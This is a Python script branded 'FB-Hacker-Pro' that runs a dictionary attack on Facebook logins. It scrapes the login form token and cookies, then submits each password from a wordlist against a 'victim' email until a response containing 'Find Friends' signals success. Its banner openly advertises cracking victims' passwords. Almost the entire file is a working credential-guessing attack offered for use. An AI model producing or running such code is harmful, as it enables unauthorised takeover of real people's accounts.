import urllib.request
import os
import requests
import threading

from bs4 import BeautifulSoup
import sys
try:
	if sys.version_info[0] < 3:
		raise "REQUIRED PYTHON 3.x"
except Exception as ex:
	print('warming : use python3 fbbrute.py')
	sys.exit()
	
post_url='https://www.facebook.com/login.php'
headers = {
	'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
}
payload={}
cookie={}
def create_form():
	form=dict()
	cookie={'fr':'0ZvhC3YwYm63ZZat1..Ba0Ipu.Io.AAA.0.0.Ba0Ipu.AWUPqDLy'}
	data=requests.get(post_url,headers=headers)
	# print('Form Creating : ',data.url)
	# print('Return Status : ',data.status_code)
	for i in data.cookies:
		cookie[i.name]=i.value
	data=BeautifulSoup(data.text,'html.parser').form
	if data.input['name']=='lsd':
		form['lsd']=data.input['value']
	return (form,cookie)

def function(email,passw,i):
	global payload,cookie
	if i%10==1:
		payload,cookie=create_form()
		payload['email']=email
	payload['pass']=passw
	# print(payload)
	# print(cookie)
	# print('lsd : ',payload['lsd'])
	# print(cookie)
	r=requests.post(post_url,data=payload,cookies=cookie,headers=headers)
	if 'Find Friends' in r.text:
		print('password is ',passw)
		#open('d.html','w').write(r.text)
		return True
	return False

#payload creation form

os.system("clear")

i=0
print(" ____________________________________________            * \n")
print(" |-------------[FB-Hacker-Pro]--------------|\n")
print(" |------------------------------------------|                                    *\n")
print(" /------------------------------------------\\      \n")

print("*  Author - Hein Arkar(Wtobe_Shining_Star) \n\n")

print('''              ▇▇▇◤▔▔▔▔▔▔▔◥▇▇▇
              ▇▇▇▏◥▇◣┊◢▇◤▕▇▇▇
           *  ▇▇▇▏▃▆▅▎▅▆▃▕▇▇▇     this tool can crack victims' password 
              ▇▇▇▏╱▔▕▎▔▔╲▕▇▇▇        even if you don't know victim's email
              ▇▇▇◣◣▃▅▎▅▃◢◢▇▇▇
*             ▇▇▇▇◣◥▅▅▅◤◢▇▇▇▇*                               
              ▇▇▇▇▇◣╲▇╱◢▇▇▇▇▇        version - v-2.0.1  *
              ▇▇▇▇▇▇◣▇◢▇▇▇▇▇▇
                                ''')

email=input      ('Enter Email of victim : ')
print("")

passlist = input ("Enter password file   : ")
print ("")
file=open(passlist,'r')

while file:
	passw=file.readline().strip()
	i+=1
	print("Trying Password " + str(i) +": ",passw+ "\t\t[Not Found] ") 
	if function(email,passw,i):
		break

